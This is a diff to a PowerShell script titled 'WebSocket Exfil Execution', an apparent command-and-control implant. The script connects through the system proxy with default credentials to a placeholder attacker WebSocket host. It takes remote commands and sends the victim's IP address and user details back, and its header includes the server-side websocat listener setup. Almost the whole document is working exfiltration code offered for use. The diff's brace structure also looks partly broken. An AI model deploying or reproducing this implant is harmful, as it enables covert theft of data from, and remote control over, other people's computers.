@@ -1,5 +1,6 @@
 <#
 WebSocket Exfil Execution 
+Initially based upon (https://gist.github.com/byt3bl33d3r/910b3161d54c2d6a3d5e1050c4e1013e) but modified to accept commands and working on more granular support.
 
 Modify line 34 to change IP and port to whatever is desired
 Required serverside we will need websocat (https://github.com/vi/websocat/releases/tag/v1.10.0)
@@ -32,28 +33,34 @@ $recv_queue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'
 $send_queue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'
 
 $ws = New-Object Net.WebSockets.ClientWebSocket
-if ($msg.contains("get-info")) {
-    $ifproxy = ([System.Net.WebRequest]::GetSystemWebproxy()).IsBypassed("http://googleusercontent.com")
-    if ($ifproxy.contains("false")) {
-        continue
-    }
+
+$ifproxy = ([System.Net.WebRequest]::GetSystemWebproxy().IsBypassed("http://googleusercontent.com"))
+if ($ifproxy -eq "True") {
+    $ws.Options.Proxy 
+    $ws.Options.UseDefaultCredentials = $true
 } else {
-    continue
-}
-$ws.Options.Proxy 
-$ws.Options.UseDefaultCredentials = $true
+ 
+    
+
+# if(!String.IsNullOrEmpty([System.Net.WebRequest]::GetSystemWebproxy().Address.AbsoluteUri)){ 
+   
+# } else {
+#     continue
+# }
+
 $cts = New-Object Threading.CancellationTokenSource
 $ct = New-Object Threading.CancellationToken($false)
 
-Write-Output "Connecting..."
+Write-Host "Connecting..."
 # Need to change this value to whatever our listening IP is, port can also be whatever
 # Serverside we will need websocat (https://github.com/vi/websocat/releases/tag/v1.10.0)
 # Run the following serverside: 
 # ./web -s 0.0.0.0:80 | tee -a log.json
-$connectTask = $ws.ConnectAsync("ws://CHANGEME:80/$client_id", $cts.Token)
-do { Sleep(1) }
+$wshost = "ws://CHANGEME:80"
+$connectTask = $ws.ConnectAsync("$wshost/$client_id", $cts.Token)
+do { Start-Sleep(1) }
 until ($connectTask.IsCompleted)
-Write-Output "Connected!"
+Write-Host "Connection Made to Websocket $wshost !"
 
 $recv_job = {
     param($ws, $client_id, $recv_queue)
@@ -102,14 +109,14 @@ $recv_job = {
     }
  }
 
-Write-Output "Starting recv runspace"
+Write-Host "Starting recv runspace"
 $recv_runspace = [PowerShell]::Create()
 $recv_runspace.AddScript($recv_job).
     AddParameter("ws", $ws).
     AddParameter("client_id", $client_id).
     AddParameter("recv_queue", $recv_queue).BeginInvoke() | Out-Null
 
-Write-Output "Starting send runspace"
+Write-Host "Starting send runspace"
 $send_runspace = [PowerShell]::Create()
 $send_runspace.AddScript($send_job).
     AddParameter("ws", $ws).
@@ -118,7 +125,7 @@ $send_runspace.AddScript($send_job).
 
 try {
     do {
-        Sleep(3)
+        Start-Sleep(3)
         $msg = $null
         $hash = @{
             ClientID = $client_id
@@ -143,25 +150,25 @@ try {
                 $test_payload = New-Object PSObject -Property $hash
                 $json = ConvertTo-Json $test_payload
                 $send_queue.Enqueue($json)
-                Write-Output "Processed message: $msg"
+                Write-Host "Processed message: $msg"
 
             }elseif ($msg.contains("get-ip")){
                 $ipinfo = New-Object psobject -Property $ipinfos
                 $jbody = ConvertTo-Json($ipinfo)
                 $send_queue.Enqueue($jbody)
-                Write-Output "IP Sent: $msg"
+                Write-Host "IP Sent: $msg"
             
             }elseif ($msg.contains("get-user")){
                 $cuserInfo = New-Object psobject -Property $cuser
                 $jbody = ConvertTo-Json($cuserInfo)
                 $send_queue.Enqueue($jbody)
-                Write-Output "IP Sent: $msg"
+                Write-Host "IP Sent: $msg"
             
             }elseif ($msg.contains("close")){
-                Write-Output "Received close request, exiting script"
+                Write-Host "Received close request, exiting script"
                 exit
             } else {
-                Write-Output "No Input Received: $msg"
+                Write-Host "No Input Received: $msg"
               }
             
             }
@@ -169,22 +176,23 @@ try {
     } until ($ws.State -ne [Net.WebSockets.WebSocketState]::Open)
 }
 finally {
-    Write-Output "Closing WS connection"
+    Write-Host "Closing WS connection"
     $closetask = $ws.CloseAsync(
         [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
         "",
         $ct
     )
-    exit
 
-    do { Sleep(1) }
+    do { Start-Sleep(1) }
     until ($closetask.IsCompleted)
     $ws.Dispose()
 
-    Write-Output "Stopping runspaces"
+    Write-Host "Stopping runspaces"
     $recv_runspace.Stop()
     $recv_runspace.Dispose()
 
     $send_runspace.Stop()
     $send_runspace.Dispose()
+}
+
 }
